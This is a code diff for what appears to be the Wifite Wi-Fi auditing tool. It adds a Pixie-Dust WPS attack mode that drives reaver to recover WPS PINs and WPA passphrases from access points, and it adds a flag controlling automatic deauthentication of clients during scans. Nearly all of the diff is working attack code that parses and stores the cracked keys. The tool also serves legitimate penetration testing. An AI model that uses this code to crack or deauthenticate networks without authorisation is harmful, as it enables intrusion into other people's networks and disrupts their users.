@@ -225,6 +225,7 @@ class RunConfiguration:
         # It's our job to put it out of monitor mode after the attacks
         self.ORIGINAL_IFACE_MAC = ('', '')  # Original interface name[0] and MAC address[1] (before spoofing)
         self.DO_NOT_CHANGE_MAC = True  # Flag for disabling MAC anonymizer
+        self.SEND_DEAUTHS = True # Flag for deauthing clients while scanning for acces points
         self.TARGETS_REMAINING = 0  # Number of access points remaining to attack
         self.WPA_CAPS_TO_CRACK = []  # list of .cap files to crack (full of CapFile objects)
         self.THIS_MAC = ''  # The interfaces current MAC address.
@@ -364,6 +365,12 @@ class RunConfiguration:
             if options.wps:
                 print GR + ' [+]' + W + ' targeting ' + G + 'WPS-enabled' + W + ' networks.'
                 self.WPS_DISABLE = False
+            if options.pixie:
+                print GR + ' [+]' + W + ' targeting ' + G + 'WPS-enabled' + W + ' networks.'
+                print GR + ' [+]' + W + ' using only ' + G + 'WPS Pixie-Dust' + W + ' attack.'
+                self.WPS_DISABLE = False
+                self.WEP_DISABLE = True
+                self.PIXIE = True
             if options.channel:
                 try:
                     self.TARGET_CHANNEL = int(options.channel)
@@ -383,6 +390,9 @@ class RunConfiguration:
             if options.monitor_interface:
                 self.MONITOR_IFACE = options.monitor_interface
                 print GR + ' [+]' + W + ' set interface already in monitor mode :%s' % (G + self.MONITOR_IFACE + W)
+            if options.nodeauth:
+                self.SEND_DEAUTHS = False
+                print GR + ' [+]' + W + ' will not deauthenticate clients while scanning%s' % W
             if options.essid:
                 try:
                     self.TARGET_ESSID = options.essid
@@ -647,6 +657,7 @@ class RunConfiguration:
         global_group.add_argument('--showb', help='Display target BSSIDs after scan.', action='store_true',
                                   dest='showb')
         global_group.add_argument('-showb', help=argparse.SUPPRESS, action='store_true', dest='showb')
+        global_group.add_argument('--nodeauth', help='Do not deauthenticate clients while scanning', action='store_true', dest='nodeauth')
         global_group.add_argument('--power', help='Attacks any targets with signal strength > [pow].', action='store',
                                   dest='power')
         global_group.add_argument('-power', help=argparse.SUPPRESS, action='store', dest='power')
@@ -734,6 +745,7 @@ class RunConfiguration:
         wps_group.add_argument('--wps', help='Only target WPS networks.', default=False, action='store_true',
                                dest='wps')
         wps_group.add_argument('-wps', help=argparse.SUPPRESS, default=False, action='store_true', dest='wps')
+        wps_group.add_argument('--pixie', help='Only use the WPS PixieDust attack', default=False, action='store_true', dest='pixie')
         wps_group.add_argument('--wpst', help='Max wait for new retry before giving up (0: never).', action='store',
                                dest='wpst')
         wps_group.add_argument('-wpst', help=argparse.SUPPRESS, action='store', dest='wpst')
@@ -1137,7 +1149,7 @@ class RunEngine:
                 if stop_scanning: break
 
                 # If there are unknown SSIDs, send deauths to them.
-                if channel != 0 and time.time() - deauth_sent > 5:
+                if self.RUN_CONFIG.SEND_DEAUTHS and channel != 0 and time.time() - deauth_sent > 5:
                     deauth_sent = time.time()
                     for t in targets:
                         if t.ssid == '':
@@ -1439,7 +1451,7 @@ class RunEngine:
                 if not need_handshake: wpa_success += 1
                 if self.RUN_CONFIG.TARGETS_REMAINING < 0: break
 
-                if not self.RUN_CONFIG.WPA_DISABLE and need_handshake:
+                if not self.RUN_CONFIG.PIXIE and not self.RUN_CONFIG.WPA_DISABLE and need_handshake:
                     wpa_total += 1
                     wpa_attack = WPAAttack(iface, t, ts_clients, self.RUN_CONFIG)
                     if wpa_attack.RunAttack():
@@ -1524,7 +1536,7 @@ class RunEngine:
                         if self.RUN_CONFIG.WEP_DISABLE and enc.find('WEP') != -1: continue
                         if self.RUN_CONFIG.WPA_DISABLE and self.RUN_CONFIG.WPS_DISABLE and enc.find(
                                 'WPA') != -1: continue
-                        if enc == "WPA2WPA":
+                        if enc == "WPA2WPA" or enc == "WPA2 WPA":
                             enc = "WPA2"
                             wps = True
                         power = int(row[8].strip())
@@ -3194,13 +3206,147 @@ class WPSAttack(Attack):
         '''
             Abstract method for initializing the WPS attack
         '''
-        self.attack_wps()
+        if self.is_pixie_supported():
+            # Try the pixie-dust attack
+            if self.attack_wps_pixie():
+                # If it succeeds, stop
+                return True
+
+        # Drop out if user specified to run ONLY the pixie attack
+        if self.RUN_CONFIG.PIXIE:
+            return False
+
+        # Try the WPS PIN attack
+        return self.attack_wps()
 
     def EndAttack(self):
         '''
             Abstract method for ending the WPS attack
         '''
         pass
+
+    def is_pixie_supported(self):
+        '''
+            Checks if current version of Reaver supports the pixie-dust attack
+        '''
+        p = Popen(['reaver', '-h'], stdout=DN, stderr=PIPE)
+        stdout = p.communicate()[1]
+        for line in stdout.split('\n'):
+            if '--pixie-dust' in line:
+                return True
+        return False
+
+    def attack_wps_pixie(self):
+        """
+            Attempts "Pixie WPS" attack which certain vendors
+            susceptible to.
+        """
+
+        # TODO Check if the user's version of reaver supports the Pixie attack (1.5.2+, "mod by t6_x")
+        #      If not, return False
+
+        print GR + ' [0:00:00]' + W + ' initializing %sWPS Pixie attack%s on %s' % \
+                                      (G, W, G + self.target.ssid + W + ' (' + G + self.target.bssid + W + ')' + W)
+        cmd = ['reaver',
+               '-i', self.iface,
+               '-b', self.target.bssid,
+               '-o', self.RUN_CONFIG.temp + 'out.out',  # Dump output to file to be monitored
+               '-c', self.target.channel,
+               '-s', 'n',
+               '-K', '1', # Pixie WPS attack
+               '-vv']  # verbose output
+
+        # Redirect stderr to output file
+        errf = open(self.RUN_CONFIG.temp + 'pixie.out', 'a')
+        # Start process
+        proc = Popen(cmd, stdout=errf, stderr=errf)
+
+        cracked = False  # Flag for when password/pin is found
+        time_started = time.time()
+        pin = ''
+        key = ''
+
+        try:
+            while not cracked:
+                time.sleep(1)
+                errf.flush()
+                if proc.poll() != None:
+                    # Process stopped: Cracked? Failed?
+                    errf.close()
+                    inf = open(self.RUN_CONFIG.temp + 'pixie.out', 'r')
+                    lines = inf.read().split('\n')
+                    inf.close()
+                    for line in lines:
+                        # When it's cracked:
+                        if line.find("WPS PIN: '") != -1:
+                            pin = line[line.find("WPS PIN: '") + 10:-1]
+                        if line.find("WPA PSK: '") != -1:
+                            key = line[line.find("WPA PSK: '") + 10:-1]
+                            cracked = True
+                        # When it' failed:
+                        if 'Pixie-Dust' in line and 'WPS pin not found' in line:
+                            # PixieDust isn't possible on this router
+                            print '\r %s WPS Pixie attack%s failed - WPS pin not found              %s' % (GR + sec_to_hms(time.time() - time_started) + G, R, W)
+                            break
+                    break
+
+                print '\r %s WPS Pixie attack:' % (GR + sec_to_hms(time.time() - time_started) + G),
+                # Check if there's an output file to parse
+                if not os.path.exists(self.RUN_CONFIG.temp + 'out.out'): continue
+                inf = open(self.RUN_CONFIG.temp + 'out.out', 'r')
+                lines = inf.read().split('\n')
+                inf.close()
+
+                output_line = ''
+                for line in lines:
+                    line = line.replace('[+]', '').replace('[!]', '').replace('\0', '').strip()
+                    if line == '' or line == ' ' or line == '\t': continue
+                    if len(line) > 50:
+                        # Trim to a reasonable size
+                        line = line[0:47] + '...'
+                    output_line = line
+
+                if 'Sending M2 message' in output_line:
+                    # At this point in the Pixie attack, all output is via stderr
+                    # We have to wait for the process to finish to see the result.
+                    print O, 'attempting to crack and fetch psk...                       ', W,
+                elif output_line != '':
+                    # Print the last message from reaver as a "status update"
+                    print C, output_line, W, ' ' * (50 - len(output_line)),
+
+                stdout.flush()
+
+                # Clear out output file
+                inf = open(self.RUN_CONFIG.temp + 'out.out', 'w')
+                inf.close()
+
+            # End of big "while not cracked" loop
+            if cracked:
+                if pin != '': print GR + '\n\n [+]' + G + ' PIN found:     %s' % (C + pin + W)
+                if key != '': print GR + ' [+] %sWPA key found:%s %s' % (G, W, C + key + W)
+                self.RUN_CONFIG.WPA_FINDINGS.append(W + "found %s's WPA key: \"%s\", WPS PIN: %s" % (
+                G + self.target.ssid + W, C + key + W, C + pin + W))
+                self.RUN_CONFIG.WPA_FINDINGS.append('')
+
+                t = Target(self.target.bssid, 0, 0, 0, 'WPA', self.target.ssid)
+                t.key = key
+                t.wps = pin
+                self.RUN_CONFIG.save_cracked(t)
+
+        except KeyboardInterrupt:
+            print R + '\n (^C)' + O + ' WPS Pixie attack interrupted' + W
+            if attack_interrupted_prompt():
+                send_interrupt(proc)
+                print ''
+                self.RUN_CONFIG.exit_gracefully(0)
+
+        send_interrupt(proc)
+
+        # Delete the files
+        os.remove(self.RUN_CONFIG.temp + "out.out")
+        os.remove(self.RUN_CONFIG.temp + "pixie.out")
+        return cracked
+
 
     def attack_wps(self):
         """
@@ -3250,6 +3396,7 @@ class WPSAttack(Attack):
                         if line.find("WPA PSK: '") != -1:
                             key = line[line.find("WPA PSK: '") + 10:-1]
                             cracked = True
+
                     break
 
                 if not os.path.exists(self.RUN_CONFIG.temp + 'out.out'): continue
